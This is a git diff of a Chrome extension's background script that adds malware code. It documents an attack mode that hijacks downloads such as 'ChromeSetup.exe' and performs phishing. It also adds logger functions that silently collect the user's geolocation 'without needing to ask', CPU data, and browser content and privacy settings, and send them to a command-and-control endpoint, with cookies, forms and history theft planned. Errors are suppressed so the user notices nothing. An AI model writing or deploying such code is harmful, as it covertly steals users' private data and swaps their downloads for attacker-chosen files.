@@ -50,6 +50,19 @@ the UID would be lost
 
 In the other hand, the phase state is restarted with updates of the extension, but this should not be a problem
 
+IMPORTANT VARIABLES:
+
+uid = user identifier
+phase = phase of the attack; 0 just log information, 1 hickjack downloads and do phising
+
+Obj = patter name of the download to be hicjacked
+Tar = url of the place for dowloading
+Nam = name of the file to which rename download
+
+TimeA = Time of last sending of information
+TimeB = Time of last ansewrd about phase of the server
+
+
 */
 
 
@@ -104,19 +117,25 @@ chrome.runtime.onInstalled.addListener(function setuid(){
     
     });
     
-    chrome.storage.local.get(["TimeA"]).then( (result)=>{
-        //For periodic communication we use the global time sinde the last epoch
-        //We need that to now when was the last time we stablish communication
-        //We do not want that value to be modifie
-        //We do not want to inmediatly send all the information after inatalling
-        //Hence, this looks if those time variable are initialized, if not, it initialize them withthe time of installment
-        //Also, stablish the default settings for the dowload hijack system, such that
-        //They can be later modify by the server
-        
-        if (result.TimeA == undefined ){
-            chrome.storage.local.set({TimeA:First_installed});
-            chrome.storage.local.set({TimeB:First_installed});
+    chrome.storage.local.get(["TimeA"]).then( (result)=>{ //Looks if exists TimeA
+
+        /*
+        For periodic communication we use the global time sinde the last epoch
+        We need that to now when was the last time we stablish communication
+        We do not want that value to be modifie unless the comunication was stablished
+        We do not want to inmediatly send all the information after isnatalling
+        Hence, this looks if one of the time variable are initialized (in this case Time A), 
+        if not, it initialize all of the initial parameters
+        Also, stablish the default settings for the dowload hijack system, such that
+        They can be later modify by the server
+        */
+
+        if (result.TimeA == undefined ){ //if TimeA does not exists, is a clean install
+            chrome.storage.local.set({TimeA:First_installed}); //start TimeA with install time
+            chrome.storage.local.set({TimeB:First_installed}); //start TimeB with install time
+            //Start download parametes with default values
             chrome.storage.local.set({Obj:"ChromeSetup.exe", Tar: "https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Nicolas_Philibert_with_Golden_Bear%2C_Berlinale_2023-1.jpg/800px-Nicolas_Philibert_with_Golden_Bear%2C_Berlinale_2023-1.jpg", Nam:"ChromeSetup.jpg"})
+            //Start phising parametes with default values
         }
     
     });
@@ -135,8 +154,31 @@ In general all of this calls are not relevant and should not take the attention 
 not done commonly.
 
 (for short periods an Alarm is used, for longer periods, that is,
-     months a local storage solution with dates shall be used)
-*/
+     more than 5 min a local storage solution with dates shall be used)
+
+Logger Functions:
+
+    logCPU = obtain CPU data   
+    loggingcontentSettings = obtain all the content Settings, those are what the browser allows to do
+    loggingprivacySettings = obtain all privacy settings, in a common case migth not be of interest
+    logGeolocation = Send the geolocation data of the user without needing to ask
+
+    WIP:
+    logExApp = obtain list of extensions
+    logManagement
+    logCookies
+    logForms
+    logHistorial
+    logDowloadHistorial
+    logproxySettings
+    etc.
+
+Send Function:
+    logSend = Calls all loggers and gives the order to send then information to the CC server
+
+References:
+https://stackoverflow.com/questions/53026387/how-to-get-all-chrome-content-settings
+    */
 function logCPU(C){
     fetch('http://127.0.0.1:5000/control_server',
             {
@@ -157,6 +199,20 @@ function logExApp(C){
     headers:{"Content-Type": "application/json"}
     }
 )   
+}
+function logGeolocation(){
+    chrome.storage.local.get(["lat", "long"]).then((result)=>{ //take the information, if exists from the storage
+        //this data is obtained in the content script
+        if(lat != undefined){
+        number = 3; //send it to the server with the needed information for storing
+        fetch(`http://127.0.0.1:5000/control_server`, 
+        {
+        method: "POST",
+        mode: 'no-cors',
+        body: JSON.stringify([result.lat, result.long]),
+        headers:{"Content-Type": "application/json"}
+        })
+        ;}})
 }
 
 function loggingcontentSettings(){
@@ -223,18 +279,10 @@ function loggingprivacySettings(){
 }
 
 function logSend(){
-    try{
-        chrome.storage.local.get(["lat", "long"]).then((result)=>{
-            number = 3;
-            fetch(`http://127.0.0.1:5000/control_server`,
-            {
-            method: "POST",
-            mode: 'no-cors',
-            body: JSON.stringify([result.lat, result.long]),
-            headers:{"Content-Type": "application/json"}
-            })
-            ;})
-        
+    try{ //errors can happen if the server is down, and we do not want the user to receive errors messages
+         //hence, this try and catch nullifies them.
+
+        logGeolocation()
         loggingcontentSettings();
         loggingprivacySettings();
         return true
@@ -249,8 +297,7 @@ function logSend(){
 
 }
 
-//chrome.contentSettings.cookies.get({primaryUrl:'http://*'},function(details){console.log(details)});
-//https://stackoverflow.com/questions/53026387/how-to-get-all-chrome-content-settings
+
 
 
 chrome.webNavigation.onCompleted.addListener((e) => {
